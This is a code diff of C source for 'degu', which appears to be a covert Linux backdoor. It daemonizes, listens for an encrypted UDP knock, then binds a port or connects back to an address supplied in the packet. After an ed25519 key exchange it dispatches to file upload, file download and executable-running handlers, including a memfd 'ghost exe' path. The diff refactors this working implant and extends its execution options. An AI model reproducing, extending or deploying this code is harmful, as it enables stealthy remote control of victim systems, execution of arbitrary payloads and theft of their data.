@@ -18,8 +18,6 @@
 
 #include "degu.h"
 
-#define MAX_FD 33000 // ewww xD you need to be an holistic hacker to get this number instead of sysconf FD_MAX
-
 void create_daemon(){
 
     int status;
@@ -37,33 +35,26 @@ void create_daemon(){
 
     umask(0);
     chdir("/");
-
-    /**
-    for (int x = MAX_FD; x>=0; x--)
-      close (x);
-    **/
 }
-
 
 /**
  after knock bot send his ephemeral key generated at startup
  > bot_pubkey 32bytes
 degu calculate ed25519 shared secret and cipher it
 <
- *
  * **/
 
-int knock_handle(int sock){
+void knock_handle(int sock){
 
     unsigned char pub[32];
 
     memcpy(&pub, bot_public_key, 32);
-    xcrypt_data(knock_key, pub, 32);
+    xnock( pub, 32);
 
     TRACE("sending bot public key.");
 
     send(sock, pub, 32, 0);
-
+    
     unsigned char header[32] = {0};
     unsigned char secret[32] = {0};
     struct timeval tv;
@@ -76,17 +67,16 @@ int knock_handle(int sock){
     if (i > 0){
 
         ed25519_key_exchange(secret, public_key, bot_private_key);
-        xcrypt_data(secret, header, 32);
 
-        if (memcmp(header,DEGU_EXE,4) == 0 ){
+        xdata(secret, header, 32);
+
+        if ((memcmp(header,DEGU_EXE_UL,4) == 0) || 
+            (memcmp(header,DEGU_EXE_MEMFD,4) == 0 ) ){
             knock_handle_exe(sock, header, secret);
-
         }else if (memcmp(header,DEGU_UP,4) == 0 ){
             knock_handle_up(sock, header, secret);
-
         }else if (memcmp(header,DEGU_DL,4) == 0 ){
             knock_handle_dl(sock, header, secret);
-
         }else{
             TRACE("bad degu magic WRONG KEY !!!");
             goto fail;
@@ -100,17 +90,15 @@ fail:
     exit(EXIT_FAILURE);
 }
 
-
-
-int knock_bind(unsigned int port){
+void knock_bind(unsigned int port){
 
     int pid = fork();
 
     if (pid < 0)
-        return -1;
+        return ;
     if (pid > 0){
        wait( NULL );
-       return -1;
+       return;
     }
     create_daemon();
 
@@ -119,14 +107,12 @@ int knock_bind(unsigned int port){
     serv_addr.sin_addr.s_addr = INADDR_ANY;
     serv_addr.sin_port = htons(port);
 
-    int sock,client;
+    int sock,client,opt;
 
     if ( (sock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))<0){
         TRACE("error creating socket");
         exit(EXIT_FAILURE);
     }
-
-    int opt;
 
     if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR ,&opt, sizeof(opt))) {
         TRACE("setsockopt reuseaddr");
@@ -153,13 +139,13 @@ int knock_bind(unsigned int port){
             tm+=1;
         } else {
             TRACE("accept client %i",client);
+            close(sock);
             knock_handle(client);
             break;
         }
     }
     close(sock);
-
-    return 0;
+    exit(EXIT_SUCCESS);
 }
 
 
@@ -188,13 +174,13 @@ void knock_cb(unsigned char *dst,unsigned int port){
         exit(EXIT_FAILURE);
     }
 
-
     if( connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
         TRACE("error connecting cb");
         exit(EXIT_FAILURE);
     }
     knock_handle(sock);
     close(sock);
+    exit(EXIT_SUCCESS);
 }
 
 /**
@@ -208,15 +194,12 @@ void knock_cb(unsigned char *dst,unsigned int port){
     if header == 0xc057  // ghost exe
     |len[2]|cmd[len]|sig[64]
     |garbage char[970+] (< 1300)
- *
- *
-
  **/
 
 int knock(unsigned char *data,size_t len){
     data = data + STRIPUDP;
 
-    xcrypt_data(knock_key, data , len);
+    xnock( data , len);
 
     unsigned int off = 32;
 
@@ -229,7 +212,7 @@ int knock(unsigned char *data,size_t len){
     }else if(data[0 + off] == 0xc4 && data[1 + off] == 0x11){
         unsigned int port = data[6 + off] | data[7 + off] << 8;
         unsigned char *dst = data + 2 + off;
-        TRACE("decryped back connect %ui", port );
+        TRACE("decryped back connect %u", port );
         knock_cb( dst , port);
         return 1;
 
@@ -244,8 +227,7 @@ int knock(unsigned char *data,size_t len){
 
     }else{
         TRACE("unable to decrypt");
-        //print_hexa("unknown", data, 32);
+        HEXDUMP("unknown", data, 32);
     }
-
     return 0;
 }
